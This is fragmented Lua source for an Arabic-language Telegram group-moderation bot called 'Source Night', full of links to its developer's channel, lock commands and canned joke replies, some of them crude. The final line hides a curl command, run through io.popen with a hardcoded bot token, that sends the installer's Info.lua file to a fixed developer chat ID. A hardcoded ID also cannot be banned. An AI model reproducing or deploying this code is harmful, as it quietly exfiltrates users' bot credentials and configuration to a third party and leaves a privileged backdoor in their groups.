...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV](t.me/ELkhawajah1)

]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙉𝙄𝙂𝙃𝙏 ', url="t.me/ELkhawajah1"}}, 
} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ELkhawajah1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
usertext = '\n ⌯ العضو » ['..result.title_..'](t.me/'..(username or 'ELkhawajah1')..')'
status  = '\n ⌯ تم ترقيته مطور'
...
usertext = '\n ⌯ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ELkhawajah1')..')'
status  = '\n ⌯ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELkhawajah1')..') \n ⌯ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ⌯ العضو : {["..data.first_name_.."](T.ME/ELkhawajah1)}\n ⌯ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
۞- [اهلا بك في سورس نايت الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ](t.me/ELkhawajah1) ۞
...
{{text = '⌯ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗡𝗜𝗚𝗛𝗧 ⌯',url="t.me/ELkhawajah1"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ELkhawajah1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text =[[
۞- [مبرمج سورس نايت](t.me/ELkhawajah1) ۞
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⌯ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELkhawajah1')..') \n ⌯ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ELkhawajah1')..') \n ⌯ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n⌯♯تم قفل البوتات بالطرد\n⌯♯تم وضع الايدي بدون صوره\n⌯♯تم قفل التكرار بالطرد\n⌯♯تم قفل الروابط\n⌯♯تم قفل التوجيه\n⌯♯تم قفل الملصقات\n⌯♯تم قفل المتحركه\n⌯♯تم قفل الفيديو\n⌯♯تم قفل السب\n⌯♯تم قفل التعديل\n⌯♯تم قفل الفارسيه\n⌯♯تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »>['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELkhawajah1')..')')   
end,nil) 
end
...
if tonumber(result.sender_user_id_) == tonumber(1819050592) then  
...
if result.id_ == tonumber(1819050592) then
...
if tonumber(userid) == tonumber(1819050592) then  
send(msg.chat_id_, msg.id_, " ⌯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ELkhawajah1')..')'
status  = '\n ⌯ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌯ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ELkhawajah1')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⌯ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'ELkhawajah1')..')'..'\n ⌯ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:set(bot_id.."ELkhawajah1:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."ELkhawajah1:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."ELkhawajah1:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."ELkhawajah1:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌯تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."ELkhawajah1:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."ELkhawajah1:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/ELkhawajah1)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/ELkhawajah1)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔??](t.me/ELkhawajah1)') 
return false
end

if text == 'مين' then 
send(msg.chat_id_,msg.id_, '[مش لازم تعرف يجميل 😂](t.me/ELkhawajah1)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/ELkhawajah1)') 
return false
end

if text == 'قفل المحن' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[تم قفل المحن يكسمك 😂](t.me/ELkhawajah1)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/ELkhawajah1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/ELkhawajah1)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/ELkhawajah1)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/ELkhawajah1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/ELkhawajah1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/ELkhawajah1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/ELkhawajah1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/ELkhawajah1)')
return false
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'ELkhawajah1')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝙉𝙄𝙂𝙃𝙏 ', url="t.me/ELkhawajah1"},
{text = 'مبرمج السورس', url="t.me/ELkhawajah1"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local curl = 'curl "'..'https://api.telegram.org/bot1796143590:AAG7xMmzOdxe_8BlKg-dYP1tfedX1ZY-3ng/sendDocument'..'" -F "chat_id='.. 1819050592 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
